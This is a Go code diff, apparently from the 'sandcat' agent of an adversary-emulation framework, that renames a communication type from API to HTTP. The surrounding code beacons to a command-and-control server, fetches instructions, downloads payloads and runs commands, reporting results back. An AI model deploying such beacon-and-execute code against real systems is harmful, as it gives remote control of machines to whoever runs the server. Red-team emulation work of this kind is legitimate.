@@ -12,16 +12,15 @@ import (
 	"strings"
 
 	"../execute"
-	"../util"
 	"../output"
+	"../util"
 )
 
-
-//API communicates through HTTP
-type API struct { }
+//Communicates through HTTP
+type HTTP struct{}
 
 //Ping tests connectivity to the server
-func (contact API) Ping(server string) bool {
+func (contact HTTP) Ping(server string) bool {
 	address := fmt.Sprintf("%s/ping", server)
 	bites := request(address, nil)
 	if string(bites) == "pong" {
@@ -33,7 +32,7 @@ func (contact API) Ping(server string) bool {
 }
 
 //GetInstructions sends a beacon and returns instructions
-func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
+func (contact HTTP) GetInstructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
 	address := fmt.Sprintf("%s/instructions", profile["server"])
 	bites := request(address, data)
@@ -52,7 +51,7 @@ func (contact API) GetInstructions(profile map[string]interface{}) map[string]in
 }
 
 //DropPayloads downloads all required payloads for a command
-func (contact API) DropPayloads(payload string, server string, uniqueId string) []string{
+func (contact HTTP) DropPayloads(payload string, server string, uniqueId string) []string {
 	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
 	var droppedPayloads []string
 	for _, payload := range payloads {
@@ -64,13 +63,13 @@ func (contact API) DropPayloads(payload string, server string, uniqueId string) 
 }
 
 //RunInstruction runs a single instruction
-func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
+func (contact HTTP) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
 	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string))
 	sendExecutionResults(command["id"], profile["server"], result, status, cmd, pid)
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
-func (contact API) C2RequirementsMet(criteria interface{}) bool {
+func (contact HTTP) C2RequirementsMet(criteria interface{}) bool {
 	return true
 }
 
